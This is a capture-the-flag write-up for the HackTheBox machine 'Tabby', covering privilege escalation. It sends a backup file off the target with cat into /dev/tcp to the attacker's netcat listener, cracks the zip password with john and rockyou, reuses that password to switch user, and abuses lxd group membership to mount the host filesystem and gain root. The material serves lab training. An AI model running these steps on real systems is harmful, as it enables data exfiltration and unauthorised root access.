# 15 - PrivEsc


# Files directory
```bash
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
```


# File Transfer
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ nc -lvp 9001 > backup.zip
listening on [any] 9001 ...


tomcat@tabby:/tmp$ cat 16162020_backup.zip  > /dev/tcp/10.10.14.14/9001
```


# Backup File
```
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ nc -lvp 9001 > backup.zip
listening on [any] 9001 ...
connect to [10.10.14.14] from megahosting.htb [10.10.10.194] 53834
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ ls
backup.zip
```

# Backup File is encrypted
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ unzip backup.zip 
Archive:  backup.zip
   creating: var/www/html/assets/
[backup.zip] var/www/html/favicon.ico password: 
```


# zip2john
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ zip2john backup.zip  > hash
```

To crack zip we need a hash, zip2john extracts the hash from the zip file.

# Cracked
```bash
┌─[user@parrot]─[10.10.14.14]─[~/htb/tabby]
└──╼ $ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (backup.zip)
1g 0:00:00:16 DONE (2021-08-21 13:18) 0.06242g/s 646615p/s 646615c/s 646615C/s adnc153..adilizinha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The backup itself doesn't have anything interesting. 


# Password reuse
```
tomcat@tabby:/tmp$ su - ash
Password: 
ash@tabby:~$ 
```



# lxd group
```bash
ash@tabby:/$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Ash is a member of the lxd group. 

Follow the instruction on https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation


# root.txt
```bash
ash@tabby:/tmp/exploit$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
ash@tabby:/tmp/exploit$ lxc start privesc
ash@tabby:/tmp/exploit$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root/
/mnt/root/root # ls
root.txt  snap
```